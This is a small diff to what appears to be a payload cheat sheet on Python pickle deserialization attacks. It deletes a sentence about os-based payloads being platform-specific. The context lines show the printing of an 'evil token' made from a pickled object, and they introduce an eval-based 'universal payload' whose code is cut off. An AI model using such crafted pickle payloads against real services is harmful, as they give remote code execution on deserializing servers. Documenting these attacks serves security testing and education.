@@ -68,8 +68,6 @@ evil_token = b64encode(cPickle.dumps(e))
 print("Your Evil Token : {}").format(evil_token)
 ```
 
-This payload uses platform-specific `os` module, so payloads generated on Windows will not work on Linux and vice versa.
-
 A universal payload can be created by loading `os` at runtime using eval:
 
 ```python
